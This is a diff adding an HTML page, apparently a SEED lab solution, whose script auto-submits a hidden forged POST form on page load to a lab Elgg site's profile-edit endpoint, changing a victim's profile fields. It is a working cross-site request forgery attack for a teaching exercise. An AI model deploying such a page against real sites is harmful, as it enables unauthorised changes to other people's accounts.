@@ -1,0 +1,36 @@
+<html><head><title>CSRF Attack using HTTP Post</title></head>
+<body>
+<h1>CSRF Attack using HTTP Post Request</h1>
+<script type="text/javascript">
+    //invoke CSRF_hack() after the page is loaded
+    window.onload = function(){csrf_hack();}
+    function post(url, fields){
+        // create form element
+        var p = document.createElement("form");
+        // contruct the form
+        p.action = url;
+        p.innerHTML = fields;
+        p.target = "_self";
+        p.method = "post";
+        // append the form to the current page
+        document.body.appendChild(p);
+        // submit the form
+        p.submit();
+    }
+    function csrf_hack(){
+        var fields;
+        fields += "<input type='hidden' name='name' value='Body'>";
+        fields += "<input type='hidden' name='description' value='I support the SEED project.'>";
+        fields += "<input type='hidden' name='accesslevel[description]' value='2'>";
+        fields += "<input type='hidden' name='briefdescription' value='A victim of the CSRF Attack'>";
+        fields += "<input type='hidden' name='accesslevel[briefdescription]' value='2'>";
+        fields += "<input type='hidden' name='location' value='Taipei, Taiwan'>";
+        fields += "<input type='hidden' name='accesslevel[location]' value='2'>";
+        fields += "<input type='hidden' name='guid' value='40'>";
+        var url = "http://www.csrflabelgg.com/action/profile/edit";
+        post(url,fields);
+    }
+</script>
+</body>
+
+</html>
